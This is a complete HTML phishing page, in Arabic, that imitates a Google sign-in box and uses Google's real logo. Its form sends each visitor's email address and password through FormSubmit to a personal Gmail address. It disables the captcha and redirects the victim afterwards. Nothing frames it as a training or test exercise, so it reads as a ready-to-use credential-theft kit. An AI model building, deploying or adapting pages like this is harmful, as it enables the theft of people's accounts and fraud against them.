
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول - GOGLE</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        .login-box img {
            width: 75px;
            margin-bottom: 20px;
        }
        .login-box input[type="email"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-box button:hover {
            background-color: #0c5ed7;
        }
        .small-text {
            font-size: 12px;
            color: gray;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2>تسجيل الدخول</h2>

    <!-- ✅ نموذج FormSubmit -->
    <form action="https://formsubmit.co/ahmedfeddaoui70@gmail.com" method="POST">
        <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required><br>
        <input type="password" name="password" placeholder="كلمة المرور" required><br>

        <!-- إعدادات مخفية -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://example.com/thanks.html">

        <button type="submit">التالي</button>
    </form>

    <div class="small-text">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></div>
</div>

</body>
</html>
